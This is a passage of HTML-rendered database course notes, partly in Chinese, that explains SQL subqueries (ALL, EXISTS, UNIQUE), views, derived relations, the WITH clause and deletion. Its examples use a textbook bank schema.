</span><span id="__span-63-2"><a id="__codelineno-63-2" name="__codelineno-63-2" href="#note-db-sql-__codelineno-63-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">branch</span>
</span><span id="__span-63-3"><a id="__codelineno-63-3" name="__codelineno-63-3" href="#note-db-sql-__codelineno-63-3"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">assets</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="k">ALL</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-63-4"><a id="__codelineno-63-4" name="__codelineno-63-4" href="#note-db-sql-__codelineno-63-4"></a><span class="w">    </span><span class="k">SELECT</span><span class="w"> </span><span class="n">assets</span>
</span><span id="__span-63-5"><a id="__codelineno-63-5" name="__codelineno-63-5" href="#note-db-sql-__codelineno-63-5"></a><span class="w">    </span><span class="k">FROM</span><span class="w"> </span><span class="n">branch</span>
</span><span id="__span-63-6"><a id="__codelineno-63-6" name="__codelineno-63-6" href="#note-db-sql-__codelineno-63-6"></a><span class="w">    </span><span class="k">WHERE</span><span class="w"> </span><span class="n">branch_city</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Brooklyn&#39;</span>
</span><span id="__span-63-7"><a id="__codelineno-63-7" name="__codelineno-63-7" href="#note-db-sql-__codelineno-63-7"></a><span class="p">);</span>
</span></code></pre></div>
or</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#note-db-sql-__codelineno-64-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">branch_name</span>
</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#note-db-sql-__codelineno-64-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">branch</span>
</span><span id="__span-64-3"><a id="__codelineno-64-3" name="__codelineno-64-3" href="#note-db-sql-__codelineno-64-3"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">assets</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">MAX</span><span class="p">(</span><span class="n">assets</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">branch</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">branch_city</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Brooklyn&#39;</span><span class="p">);</span>
</span></code></pre></div>
<h3 id="note-db-sql-test-for-empty-relations">Test for Empty Relations<a class="headerlink" href="#note-db-sql-test-for-empty-relations" title="Permanent link">&para;</a></h3>
<p>The <code>exists</code> construct returns the value true if the argument subquery is non-empty. </p>
<ul>
<li><code>exists</code> <span class="arithmatex">\(r\)</span> equal to <span class="arithmatex">\(r \neq \emptyset\)</span></li>
<li><code>not exists</code> <span class="arithmatex">\(r\)</span> equal to <span class="arithmatex">\(r = \emptyset\)</span></li>
</ul>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>Find all customers who have accounts at all branches located in city Brooklyn. </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#note-db-sql-__codelineno-65-1"></a><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">DISTINCT</span><span class="w"> </span><span class="n">S</span><span class="p">.</span><span class="n">customer_name</span>
</span><span id="__span-65-2"><a id="__codelineno-65-2" name="__codelineno-65-2" href="#note-db-sql-__codelineno-65-2"></a><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">depositor</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">S</span>
</span><span id="__span-65-3"><a id="__codelineno-65-3" name="__codelineno-65-3" href="#note-db-sql-__codelineno-65-3"></a><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">EXISTS</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-65-4"><a id="__codelineno-65-4" name="__codelineno-65-4" href="#note-db-sql-__codelineno-65-4"></a><span class="w">     </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">branch_name</span>
</span><span id="__span-65-5"><a id="__codelineno-65-5" name="__codelineno-65-5" href="#note-db-sql-__codelineno-65-5"></a><span class="w">      </span><span class="k">FROM</span><span class="w"> </span><span class="n">branch</span>
</span><span id="__span-65-6"><a id="__codelineno-65-6" name="__codelineno-65-6" href="#note-db-sql-__codelineno-65-6"></a><span class="w">      </span><span class="k">WHERE</span><span class="w"> </span><span class="n">branch_city</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Brooklyn&#39;</span><span class="p">)</span>
</span><span id="__span-65-7"><a id="__codelineno-65-7" name="__codelineno-65-7" href="#note-db-sql-__codelineno-65-7"></a><span class="w">     </span><span class="k">EXCEPT</span>
</span><span id="__span-65-8"><a id="__codelineno-65-8" name="__codelineno-65-8" href="#note-db-sql-__codelineno-65-8"></a><span class="w">     </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">DISTINCT</span><span class="w"> </span><span class="n">R</span><span class="p">.</span><span class="n">branch_name</span>
</span><span id="__span-65-9"><a id="__codelineno-65-9" name="__codelineno-65-9" href="#note-db-sql-__codelineno-65-9"></a><span class="w">      </span><span class="k">FROM</span><span class="w"> </span><span class="n">depositor</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">T</span><span class="p">,</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">R</span>
</span><span id="__span-65-10"><a id="__codelineno-65-10" name="__codelineno-65-10" href="#note-db-sql-__codelineno-65-10"></a><span class="w">      </span><span class="k">WHERE</span><span class="w"> </span><span class="n">T</span><span class="p">.</span><span class="n">account_number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">R</span><span class="p">.</span><span class="n">account_number</span>
</span><span id="__span-65-11"><a id="__codelineno-65-11" name="__codelineno-65-11" href="#note-db-sql-__codelineno-65-11"></a><span class="w">      </span><span class="k">AND</span><span class="w"> </span><span class="n">S</span><span class="p">.</span><span class="n">customer_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">T</span><span class="p">.</span><span class="n">customer_name</span><span class="p">)</span>
</span><span id="__span-65-12"><a id="__codelineno-65-12" name="__codelineno-65-12" href="#note-db-sql-__codelineno-65-12"></a><span class="w"> </span><span class="p">);</span>
</span></code></pre></div>
<p>即挑出的S将满足，<strong>Brooklyn所有支行的branch_number减去S有账户的branch_number后，为空</strong>。
而由于</p>
<div class="arithmatex">\[
   A - B = \emptyset \iff A \subseteq B
\]</div>
<p>所以挑出的S将满足，<strong>S有账户的branch_number包含了Brooklyn所有支行的branch_number</strong>。</p>
<p>也就满足了要求。</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#note-db-sql-__codelineno-66-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">DISTINCT</span><span class="w"> </span><span class="n">S</span><span class="p">.</span><span class="n">customer_name</span>
</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2" href="#note-db-sql-__codelineno-66-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">depositor</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">S</span>
</span><span id="__span-66-3"><a id="__codelineno-66-3" name="__codelineno-66-3" href="#note-db-sql-__codelineno-66-3"></a><span class="k">WHERE</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">EXISTS</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-66-4"><a id="__codelineno-66-4" name="__codelineno-66-4" href="#note-db-sql-__codelineno-66-4"></a><span class="w">    </span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span>
</span><span id="__span-66-5"><a id="__codelineno-66-5" name="__codelineno-66-5" href="#note-db-sql-__codelineno-66-5"></a><span class="w">    </span><span class="k">FROM</span><span class="w"> </span><span class="n">branch</span><span class="w"> </span><span class="n">B</span>
</span><span id="__span-66-6"><a id="__codelineno-66-6" name="__codelineno-66-6" href="#note-db-sql-__codelineno-66-6"></a><span class="w">    </span><span class="k">WHERE</span><span class="w"> </span><span class="n">branch_city</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Brooklyn&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">EXISTS</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-66-7"><a id="__codelineno-66-7" name="__codelineno-66-7" href="#note-db-sql-__codelineno-66-7"></a><span class="w">        </span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span>
</span><span id="__span-66-8"><a id="__codelineno-66-8" name="__codelineno-66-8" href="#note-db-sql-__codelineno-66-8"></a><span class="w">        </span><span class="k">FROM</span><span class="w"> </span><span class="n">depositor</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">T</span><span class="p">,</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">R</span>
</span><span id="__span-66-9"><a id="__codelineno-66-9" name="__codelineno-66-9" href="#note-db-sql-__codelineno-66-9"></a><span class="w">        </span><span class="k">WHERE</span><span class="w"> </span><span class="n">T</span><span class="p">.</span><span class="n">account_number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">R</span><span class="p">.</span><span class="n">account_number</span>
</span><span id="__span-66-10"><a id="__codelineno-66-10" name="__codelineno-66-10" href="#note-db-sql-__codelineno-66-10"></a><span class="w">        </span><span class="k">AND</span><span class="w"> </span><span class="n">R</span><span class="p">.</span><span class="n">branch_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">B</span><span class="p">.</span><span class="n">branch_name</span>
</span><span id="__span-66-11"><a id="__codelineno-66-11" name="__codelineno-66-11" href="#note-db-sql-__codelineno-66-11"></a><span class="w">        </span><span class="k">AND</span><span class="w"> </span><span class="n">S</span><span class="p">.</span><span class="n">customer_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">T</span><span class="p">.</span><span class="n">customer_name</span>
</span><span id="__span-66-12"><a id="__codelineno-66-12" name="__codelineno-66-12" href="#note-db-sql-__codelineno-66-12"></a><span class="w">    </span><span class="p">)</span>
</span><span id="__span-66-13"><a id="__codelineno-66-13" name="__codelineno-66-13" href="#note-db-sql-__codelineno-66-13"></a><span class="p">);</span>
</span></code></pre></div>
<p>这里有两个not exists，里面的select子句挑出了在Brooklyn中没有某些支行账户的表格，外面的not exists挑出了不存在这一条件的客户;
即 <strong>不存在在Brooklyn中不存在账户的客户</strong> ，也就是 <strong>在Brooklyn的所有支行都有账户的客户</strong> 。</p>
</div>
<h3 id="note-db-sql-test-for-absence-of-duplicate-tuples">Test for Absence of Duplicate Tuples<a class="headerlink" href="#note-db-sql-test-for-absence-of-duplicate-tuples" title="Permanent link">&para;</a></h3>
<p>The unique construct tests whether a subquery has any duplicate tuples in its result. </p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>Find all customers who have at most one account at the Perryridge branch. </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#note-db-sql-__codelineno-67-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">customer_name</span>
</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#note-db-sql-__codelineno-67-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">depositor</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">T</span>
</span><span id="__span-67-3"><a id="__codelineno-67-3" name="__codelineno-67-3" href="#note-db-sql-__codelineno-67-3"></a><span class="k">WHERE</span><span class="w"> </span><span class="k">UNIQUE</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-67-4"><a id="__codelineno-67-4" name="__codelineno-67-4" href="#note-db-sql-__codelineno-67-4"></a><span class="w">    </span><span class="k">SELECT</span><span class="w"> </span><span class="n">R</span><span class="p">.</span><span class="n">customer_name</span>
</span><span id="__span-67-5"><a id="__codelineno-67-5" name="__codelineno-67-5" href="#note-db-sql-__codelineno-67-5"></a><span class="w">    </span><span class="k">FROM</span><span class="w"> </span><span class="n">account</span><span class="p">,</span><span class="w"> </span><span class="n">depositor</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">R</span>
</span><span id="__span-67-6"><a id="__codelineno-67-6" name="__codelineno-67-6" href="#note-db-sql-__codelineno-67-6"></a><span class="w">    </span><span class="k">WHERE</span><span class="w"> </span><span class="n">T</span><span class="p">.</span><span class="n">customer_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">R</span><span class="p">.</span><span class="n">customer_name</span>
</span><span id="__span-67-7"><a id="__codelineno-67-7" name="__codelineno-67-7" href="#note-db-sql-__codelineno-67-7"></a><span class="w">    </span><span class="k">AND</span><span class="w"> </span><span class="n">R</span><span class="p">.</span><span class="n">account_number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">account</span><span class="p">.</span><span class="n">account_number</span>
</span><span id="__span-67-8"><a id="__codelineno-67-8" name="__codelineno-67-8" href="#note-db-sql-__codelineno-67-8"></a><span class="w">    </span><span class="k">AND</span><span class="w"> </span><span class="n">account</span><span class="p">.</span><span class="n">branch_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Perryridge&#39;</span>
</span><span id="__span-67-9"><a id="__codelineno-67-9" name="__codelineno-67-9" href="#note-db-sql-__codelineno-67-9"></a><span class="p">);</span>
</span></code></pre></div>
<p>Find all customers who have at least two accounts at the Perryridge branch. </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#note-db-sql-__codelineno-68-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">DISTINCT</span><span class="w"> </span><span class="n">T</span><span class="p">.</span><span class="n">customer_name</span>
</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2" href="#note-db-sql-__codelineno-68-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">depositor</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">T</span>
</span><span id="__span-68-3"><a id="__codelineno-68-3" name="__codelineno-68-3" href="#note-db-sql-__codelineno-68-3"></a><span class="k">WHERE</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">UNIQUE</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-68-4"><a id="__codelineno-68-4" name="__codelineno-68-4" href="#note-db-sql-__codelineno-68-4"></a><span class="w">      </span><span class="k">SELECT</span><span class="w"> </span><span class="n">R</span><span class="p">.</span><span class="n">customer_name</span>
</span><span id="__span-68-5"><a id="__codelineno-68-5" name="__codelineno-68-5" href="#note-db-sql-__codelineno-68-5"></a><span class="w">      </span><span class="k">FROM</span><span class="w"> </span><span class="n">account</span><span class="p">,</span><span class="w"> </span><span class="n">depositor</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">R</span>
</span><span id="__span-68-6"><a id="__codelineno-68-6" name="__codelineno-68-6" href="#note-db-sql-__codelineno-68-6"></a><span class="w">      </span><span class="k">WHERE</span><span class="w"> </span><span class="n">T</span><span class="p">.</span><span class="n">customer_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">R</span><span class="p">.</span><span class="n">customer_name</span>
</span><span id="__span-68-7"><a id="__codelineno-68-7" name="__codelineno-68-7" href="#note-db-sql-__codelineno-68-7"></a><span class="w">      </span><span class="k">AND</span><span class="w"> </span><span class="n">R</span><span class="p">.</span><span class="n">account_number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">account</span><span class="p">.</span><span class="n">account_number</span>
</span><span id="__span-68-8"><a id="__codelineno-68-8" name="__codelineno-68-8" href="#note-db-sql-__codelineno-68-8"></a><span class="w">      </span><span class="k">AND</span><span class="w"> </span><span class="n">account</span><span class="p">.</span><span class="n">branch_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Perryridge&#39;</span>
</span><span id="__span-68-9"><a id="__codelineno-68-9" name="__codelineno-68-9" href="#note-db-sql-__codelineno-68-9"></a><span class="p">);</span>
</span></code></pre></div>
</div>
<h2 id="note-db-sql-views">Views<a class="headerlink" href="#note-db-sql-views" title="Permanent link">&para;</a></h2>
<p>A view is a virtual table that is defined by a query. It is a stored query that can be used to simplify complex queries and to provide a consistent view of the data.</p>
<p>Provide a mechanism to hide certain data from the view of certain users. </p>
<h3 id="note-db-sql-create-view">Create View<a class="headerlink" href="#note-db-sql-create-view" title="Permanent link">&para;</a></h3>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#note-db-sql-__codelineno-69-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">VIEW</span><span class="w"> </span><span class="n">view_name</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">attribute_list</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">condition</span><span class="p">;</span>
</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#note-db-sql-__codelineno-69-2"></a><span class="c1">-- or</span>
</span><span id="__span-69-3"><a id="__codelineno-69-3" name="__codelineno-69-3" href="#note-db-sql-__codelineno-69-3"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">VIEW</span><span class="w"> </span><span class="n">view_name</span><span class="w"> </span><span class="p">(</span><span class="n">c1</span><span class="p">,</span><span class="w"> </span><span class="n">c2</span><span class="p">,</span><span class="w"> </span><span class="p">...,</span><span class="w"> </span><span class="n">cn</span><span class="p">)</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">attribute_list</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">condition</span><span class="p">;</span>
</span></code></pre></div>
<div class="admonition advice">
<p class="admonition-title">Advice</p>
<p>Benefits of using views 
- Security 
- Easy to use, support logical independence
- Simplify complex queries
- Hide certain data from the view of certain users</p>
</div>
<h3 id="note-db-sql-drop-view">Drop View<a class="headerlink" href="#note-db-sql-drop-view" title="Permanent link">&para;</a></h3>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#note-db-sql-__codelineno-70-1"></a><span class="k">DROP</span><span class="w"> </span><span class="k">VIEW</span><span class="w"> </span><span class="n">view_name</span><span class="p">;</span>
</span></code></pre></div>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>Create a view consisting of branches and their customer names. </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#note-db-sql-__codelineno-71-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">VIEW</span><span class="w"> </span><span class="n">all_customer</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span>
</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#note-db-sql-__codelineno-71-2"></a><span class="p">(</span>
</span><span id="__span-71-3"><a id="__codelineno-71-3" name="__codelineno-71-3" href="#note-db-sql-__codelineno-71-3"></a><span class="w">    </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">branch_name</span><span class="p">,</span><span class="w"> </span><span class="n">customer_name</span><span class="w"> </span>
</span><span id="__span-71-4"><a id="__codelineno-71-4" name="__codelineno-71-4" href="#note-db-sql-__codelineno-71-4"></a><span class="w">     </span><span class="k">FROM</span><span class="w"> </span><span class="n">depositor</span><span class="p">,</span><span class="w"> </span><span class="n">account</span><span class="w"> </span>
</span><span id="__span-71-5"><a id="__codelineno-71-5" name="__codelineno-71-5" href="#note-db-sql-__codelineno-71-5"></a><span class="w">     </span><span class="k">WHERE</span><span class="w"> </span><span class="n">depositor</span><span class="p">.</span><span class="n">account_number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">account</span><span class="p">.</span><span class="n">account_number</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-71-6"><a id="__codelineno-71-6" name="__codelineno-71-6" href="#note-db-sql-__codelineno-71-6"></a><span class="w">   </span><span class="k">UNION</span>
</span><span id="__span-71-7"><a id="__codelineno-71-7" name="__codelineno-71-7" href="#note-db-sql-__codelineno-71-7"></a><span class="w">    </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">branch_name</span><span class="p">,</span><span class="w"> </span><span class="n">customer_name</span><span class="w"> </span>
</span><span id="__span-71-8"><a id="__codelineno-71-8" name="__codelineno-71-8" href="#note-db-sql-__codelineno-71-8"></a><span class="w">     </span><span class="k">FROM</span><span class="w"> </span><span class="n">borrower</span><span class="p">,</span><span class="w"> </span><span class="n">loan</span><span class="w"> </span>
</span><span id="__span-71-9"><a id="__codelineno-71-9" name="__codelineno-71-9" href="#note-db-sql-__codelineno-71-9"></a><span class="w">     </span><span class="k">WHERE</span><span class="w"> </span><span class="n">borrower</span><span class="p">.</span><span class="n">loan_number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">loan</span><span class="p">.</span><span class="n">loan_number</span><span class="p">)</span>
</span><span id="__span-71-10"><a id="__codelineno-71-10" name="__codelineno-71-10" href="#note-db-sql-__codelineno-71-10"></a><span class="p">);</span>
</span></code></pre></div>
</div>
<h2 id="note-db-sql-derived-relations">Derived Relations<a class="headerlink" href="#note-db-sql-derived-relations" title="Permanent link">&para;</a></h2>
<p>In SQL, Derived Relations (derived relations) are created through subqueries (subquery) in the <code>FROM</code> clause. They are typically used to simplify complex queries and make them more readable.</p>
<p>Such as:Find the average account balance of those branches where the average account balance is greater than $500. </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#note-db-sql-__codelineno-72-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">branch_name</span><span class="p">,</span><span class="w"> </span><span class="n">avg_bal</span><span class="w"> </span>
</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2" href="#note-db-sql-__codelineno-72-2"></a><span class="w">     </span><span class="k">FROM</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">branch_name</span><span class="p">,</span><span class="w"> </span><span class="k">avg</span><span class="p">(</span><span class="n">balance</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-72-3"><a id="__codelineno-72-3" name="__codelineno-72-3" href="#note-db-sql-__codelineno-72-3"></a><span class="w">      </span><span class="k">FROM</span><span class="w"> </span><span class="n">account</span><span class="w"> </span>
</span><span id="__span-72-4"><a id="__codelineno-72-4" name="__codelineno-72-4" href="#note-db-sql-__codelineno-72-4"></a><span class="w">      </span><span class="k">GROUP</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">branch_name</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-72-5"><a id="__codelineno-72-5" name="__codelineno-72-5" href="#note-db-sql-__codelineno-72-5"></a><span class="w">      </span><span class="k">as</span><span class="w"> </span><span class="k">result</span><span class="w"> </span><span class="p">(</span><span class="n">branch_name</span><span class="p">,</span><span class="w"> </span><span class="n">avg_bal</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-72-6"><a id="__codelineno-72-6" name="__codelineno-72-6" href="#note-db-sql-__codelineno-72-6"></a><span class="w">     </span><span class="k">WHERE</span><span class="w"> </span><span class="n">avg_bal</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">500</span><span class="w"> </span>
</span></code></pre></div>
<blockquote>
<p>The derived table must have its own alias</p>
</blockquote>
<h3 id="note-db-sql-with-clause">With Clause<a class="headerlink" href="#note-db-sql-with-clause" title="Permanent link">&para;</a></h3>
<p>The WITH clause allows views to be defined locally for a query, rather than globally. </p>
<blockquote>
<p><code>WITH</code> 子句允许在查询中局部定义视图，而不是全局定义。这意味着你可以在一个特定的查询中创建一个临时的视图，这个视图只在该查询的上下文中可用，而不会影响数据库的其他部分。这种方法的好处是可以简化复杂查询，使其更易于阅读和维护，同时避免在数据库中创建永久视图。使用 <code>WITH</code> 子句，你可以在查询中定义多个子查询，并在主查询中引用它们，从而提高查询的可读性和效率。</p>
</blockquote>
<p>Such as:Find all accounts with the maximum balance. </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#note-db-sql-__codelineno-73-1"></a><span class="k">WITH</span><span class="w"> </span><span class="n">max_balance</span><span class="p">(</span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2" href="#note-db-sql-__codelineno-73-2"></a><span class="w">    </span><span class="k">SELECT</span><span class="w"> </span><span class="k">max</span><span class="p">(</span><span class="n">balance</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-73-3"><a id="__codelineno-73-3" name="__codelineno-73-3" href="#note-db-sql-__codelineno-73-3"></a><span class="w">    </span><span class="k">FROM</span><span class="w"> </span><span class="n">account</span>
</span><span id="__span-73-4"><a id="__codelineno-73-4" name="__codelineno-73-4" href="#note-db-sql-__codelineno-73-4"></a><span class="p">)</span>
</span><span id="__span-73-5"><a id="__codelineno-73-5" name="__codelineno-73-5" href="#note-db-sql-__codelineno-73-5"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">account_number</span><span class="w"> </span>
</span><span id="__span-73-6"><a id="__codelineno-73-6" name="__codelineno-73-6" href="#note-db-sql-__codelineno-73-6"></a><span class="k">FROM</span><span class="w"> </span><span class="n">account</span><span class="p">,</span><span class="w"> </span><span class="n">max_balance</span><span class="w"> </span>
</span><span id="__span-73-7"><a id="__codelineno-73-7" name="__codelineno-73-7" href="#note-db-sql-__codelineno-73-7"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">account</span><span class="p">.</span><span class="n">balance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">max_balance</span><span class="p">.</span><span class="n">value</span><span class="p">;</span>
</span></code></pre></div>
<h2 id="note-db-sql-modification-of-database">Modification of Database<a class="headerlink" href="#note-db-sql-modification-of-database" title="Permanent link">&para;</a></h2>
<h3 id="note-db-sql-deletion">Deletion<a class="headerlink" href="#note-db-sql-deletion" title="Permanent link">&para;</a></h3>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#note-db-sql-__codelineno-74-1"></a><span class="k">DELETE</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">condition</span><span class="p">;</span>
</span></code></pre></div>
<p>such as: Delete all accounts and relevant information at depositor for every branch located in Needham city. </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#note-db-sql-__codelineno-75-1"></a><span class="k">DELETE</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">account</span><span class="w"> </span>
</span><span id="__span-75-2"><a id="__codelineno-75-2" name="__codelineno-75-2" href="#note-db-sql-__codelineno-75-2"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">branch_name</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-75-3"><a id="__codelineno-75-3" name="__codelineno-75-3" href="#note-db-sql-__codelineno-75-3"></a><span class="w">    </span><span class="k">SELECT</span><span class="w"> </span><span class="n">branch_name</span><span class="w"> </span>
</span><span id="__span-75-4"><a id="__codelineno-75-4" name="__codelineno-75-4" href="#note-db-sql-__codelineno-75-4"></a><span class="w">    </span><span class="k">FROM</span><span class="w"> </span><span class="n">branch</span><span class="w"> </span>
</span><span id="__span-75-5"><a id="__codelineno-75-5" name="__codelineno-75-5" href="#note-db-sql-__codelineno-75-5"></a><span class="w">    </span><span class="k">WHERE</span><span class="w"> </span><span class="n">branch_city</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Needham&#39;</span>
</span><span id="__span-75-6"><a id="__codelineno-75-6" name="__codelineno-75-6" href="#note-db-sql-__codelineno-75-6"></a><span class="p">);</span>
</span><span id="__span-75-7"><a id="__codelineno-75-7" name="__codelineno-75-7" href="#note-db-sql-__codelineno-75-7"></a>
</span><span id="__span-75-8"><a id="__codelineno-75-8" name="__codelineno-75-8" href="#note-db-sql-__codelineno-75-8"></a><span class="k">DELETE</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">depositor</span><span class="w"> </span>
</span><span id="__span-75-9"><a id="__codelineno-75-9" name="__codelineno-75-9" href="#note-db-sql-__codelineno-75-9"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">account_number</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-75-10"><a id="__codelineno-75-10" name="__codelineno-75-10" href="#note-db-sql-__codelineno-75-10"></a><span class="w">    </span><span class="k">SELECT</span><span class="w"> </span><span class="n">account_number</span><span class="w"> </span>
